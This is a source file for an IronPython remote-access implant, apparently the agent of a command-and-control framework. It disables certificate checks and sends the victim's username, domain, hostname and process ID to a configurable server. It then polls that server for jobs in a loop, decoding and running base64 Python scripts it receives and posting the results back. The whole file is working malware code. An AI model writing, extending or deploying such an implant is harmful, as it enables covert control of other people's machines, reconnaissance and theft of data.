# -*- coding: utf-8 -*-

import clr
import sys
clr.AddReference(IronPythonDLL)
#clr.AddReference("IronPython")
clr.AddReference("System")
clr.AddReference("System.Management")
#clr.AddReference("System.Text.Encoding")
#clr.AddReference("System.Threading")
#clr.AddReference("System.Net")
clr.AddReference("System.Web.Extensions")
#clr.AddReference("System.IO")
import System.Text.Encoding as Encoding
from System import Convert, Guid, Environment, Uri
from System.Management import ManagementObject
from System.Diagnostics import Process
from System.IO import StreamReader
from System.Net import WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache
from System.Net.Security import RemoteCertificateValidationCallback
from System.Threading import Thread
from System.Threading.Tasks import Task
from System.Web.Script.Serialization import JavaScriptSerializer
from IronPython.Hosting import Python

#DEBUG = True
#URL =  "https://172.16.164.1/"

def urljoin(*args):
    return "/".join(arg.strip("/") for arg in args)

class NotSerializable(Exception):
    pass

class Serializable(object):
    def __serialize__(self):
        class_dict = {}
        for key in self.__dict__.keys():
            value = getattr(self, key)
            if not callable(value):
                class_dict[key.lower()] = value

        return class_dict

class Response(object):
    def __init__(self, response):
        self.text = response
        self.text_unicode = Encoding.UTF8.GetString(Encoding.Default.GetBytes(response))

    def json(self):
        return JavaScriptSerializer().DeserializeObject(self.text)

class Requests(object):
    def __init__(self, verify=False, proxy_aware=True, ssl_versions = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12):
        self.proxy_aware = proxy_aware
        ServicePointManager.SecurityProtocol = ssl_versions
        if not verify:
            ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback(lambda srvPoint, certificate, chain, errors: True)

    def post(self, url, payload='', json=None):
        r = WebRequest.Create(url)
        r.Method = "POST"
        #r.Accept = "application/json"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        if json:
            r.ContentType = "application/json"
            if type(json) == dict:
                payload = JavaScriptSerializer().Serialize(json)
            elif hasattr(json, '__serialize__'):
                payload = JavaScriptSerializer().Serialize(json.__serialize__())
            else:
                raise NotSerializable("{} object is not serializable".format(type(json)))

        if len(payload):
            data = Encoding.ASCII.GetBytes(payload)
            r.ContentLength = data.Length
            requestStream = r.GetRequestStream()
            requestStream.Write(data, 0, data.Length)
            requestStream.Close()

        response = r.GetResponse()
        responseStream = StreamReader(response.GetResponseStream())
        return Response(responseStream.ReadToEnd())

    def get(self, url):
        r = WebRequest.Create(url)
        r.Method = "GET"
        #r.ContentType = "application/json"
        #r.Accept = "application/json"

        response = r.GetResponse()
        responseStream = StreamReader(response.GetResponseStream())
        return Response(responseStream.ReadToEnd())

class STClient(Serializable):
    def __init__(self):
        p = Process.GetCurrentProcess()

        self.SLEEP = 5000
        self.JITTER = 5000
        self.FIRST_CHECKIN = True
        self.GUID = Guid().NewGuid().ToString()
        self.URL = str(Uri(Uri(URL), self.GUID))  # This needs to be a tuple of callback domains (eventually)
        self.USERNAME = Environment.UserName
        self.DOMAIN = Environment.UserDomainName
        #self.IP = ManagementObject("Win32_NetworkAdapterConfiguration")
        #self.OS = ManagementObject("Win32_OperatingSystem")
        self.PROCESS = p.Id
        self.PROCESS_NAME = p.ProcessName
        self.HOSTNAME = Environment.MachineName
        self.JOBS = []

    def run_job(self, job, requests):
        payload = {'id': job['id']}
        if DEBUG: print "Running job (id: {}): {}".format(job['id'], job)
        try:
            result = getattr(self, job['command'])(job['args'], job['data'])
            payload['state'] = 'success'
            payload['result'] = result
        except AttributeError as e:
            payload['state'] = 'error'
            payload['result'] = 'Unknown command {}'.format(job['command'])
        except Exception as e:
            payload['state'] = 'error'
            payload['result'] = 'Exception when executing command {}: {}'.format(job['command'], e)

        while True:
            try:
                requests.post(urljoin(self.URL, '/jobs', job['id']), json=payload)
                return
            except Exception as e:
                if DEBUG: print "Error sending job results (id: {}): {}".format(job['id'], e)
                Thread.Sleep(self.SLEEP)

    def run_script(self, args, data):
        script = Encoding.UTF8.GetString(Convert.FromBase64String(data))
        engine = Python.CreateEngine()
        #hosted_sys = Python.GetSysModule(engine)
        #hosted_sys.path = sys.path
        #hosted_sys.meta_path = sys.meta_path
        #script = bytes(script).decode("UTF-8")
        result = engine.Execute(script)
        return result

    def shell(self, args, data):
        return

    def checkin(self, args, data):
        return

    def sleep(self, args, data):
        Thread.Sleep(int(args))
        return 'Done'

requests = Requests()
client = STClient()

while True:
    try:
        if client.FIRST_CHECKIN:
            requests.post(client.URL, json=client)
            client.FIRST_CHECKIN = False

        r = requests.get(urljoin(client.URL, '/jobs'))
        if len(r.json()):
            t = Task[long](lambda: client.run_job(r.json(), requests))
            t.Start()
    except Exception as e:
        if DEBUG: print "Error performing HTTP request: " + str(e)
    finally:
        #If c# main function is STAThread or if running from ipy
        Thread.CurrentThread.Join(client.SLEEP)
        #Thread.Sleep(client.SLEEP)
